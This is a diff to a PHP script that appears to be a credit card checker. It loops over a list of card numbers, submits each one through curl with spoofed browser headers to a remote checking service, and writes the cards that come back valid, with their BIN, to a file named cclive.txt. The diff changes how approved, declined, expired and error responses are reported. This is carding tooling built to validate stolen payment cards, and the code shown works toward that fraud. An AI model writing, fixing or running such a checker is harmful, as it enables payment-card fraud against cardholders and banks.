@@ -25,29 +25,28 @@ for ($a = 0;$a < $jumlah;$a++)
     echo "$ [$no/$jumlah] $data[$a] => ";
     $cek = ngecek($data[$a]);
 
-    if ($cek['status']=="approved")
+    if ($cek['error']==0)
     {
         file_put_contents("cclive.txt", $data[$a] ." - ". $cek['bin'] ."\n", FILE_APPEND);
-        echo "\033[1;32mApproved - ".$cek['bin']."\033[0m\n";
+        echo "\033[1;32m".$cek['msg']." - ".$cek['bin']."\033[0m\n";
     }
     elseif ($cek['error']==2)
     {
-        echo "\033[1;31mDeclined\033[0m\n";
+        echo "\033[1;31m".$cek['msg']."\033[0m\n";
 
     }
-    elseif ($cek['error']==3)
-    {
-        echo "\033[1;36mCard Expired\033[0m\n";
-    
-	}
     elseif ($cek['error']==5)
     {
         echo "\033[1;36m".$cek['status']."\033[0m\n";
         goto ulang;
     }
-	elseif ($cek['error']==1)
+    elseif ($cek['error']==3)
     {
-        echo "\033[1;31mDeclined\033[0m\n";
+        echo "\033[1;36mCard Expired\033[0m\n";
+    }
+    elseif ($cek['error']==1)
+    {
+        echo "\033[1;33mUncheck contact Paman\033[0m\n";
     }
     else
     {
@@ -66,15 +65,13 @@ function ngecek($cece)
 
     $headers = array();
     $headers[] = 'Connection: keep-alive';
-	$headers[] = 'Cache-Control: max-age=0';
-	$headers[] = 'Upgrade-Insecure-Requests: 1';
-	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36';
-	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
-	$headers[] = 'Accept-Language: en-US,en;q=0.9,id;q=0.8';
+    $headers[] = 'Upgrade-Insecure-Requests: 1';
+    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36';
+    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
+    $headers[] = 'Accept-Language: en-US,en;q=0.9';
     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 
     $result = curl_exec($ch);
     return json_decode($result, true);
     curl_close($ch);
 }
-            
